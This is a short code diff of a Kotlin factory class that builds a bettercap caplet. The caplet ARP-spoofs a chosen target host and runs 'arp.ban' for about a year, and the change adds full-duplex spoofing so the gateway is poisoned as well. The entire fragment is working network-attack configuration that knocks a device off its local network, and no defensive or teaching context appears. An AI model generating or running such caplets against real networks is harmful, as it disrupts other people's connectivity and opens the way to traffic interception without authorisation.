@@ -9,6 +9,7 @@ class BettercapCapletFactory(
     fun buildArpBanCaplet(targetHost: String): String {
         return """
 set events.stream.output stdout
+set arp.spoof.fullduplex true
 set arp.spoof.targets $targetHost
 arp.ban on
 sleep 31536000
